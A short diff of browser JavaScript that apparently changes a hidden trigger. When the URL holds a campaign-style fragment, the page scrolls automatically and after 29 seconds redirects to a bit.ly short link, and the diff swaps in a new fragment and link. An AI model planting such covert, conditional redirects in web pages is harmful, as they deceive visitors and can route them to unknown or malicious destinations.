@@ -1,4 +1,4 @@
-if (window.location.href.indexOf("wbCnHQ") > -1 ) {
+if (window.location.href.indexOf("#utm_source=ggl") > -1 ) {
 
 scrollingElement = (document.scrollingElement || document.body)
 
@@ -16,6 +16,6 @@ setTimeout(function scrol(){
 
 setTimeout(function scrol(){
 window.scrollTo(0, 1600);
-window.location.href = "http://bit.ly/2Rqo0OK";
+window.location.href = "http://bit.ly/3aRbG1G";
 }, 29000);
 }
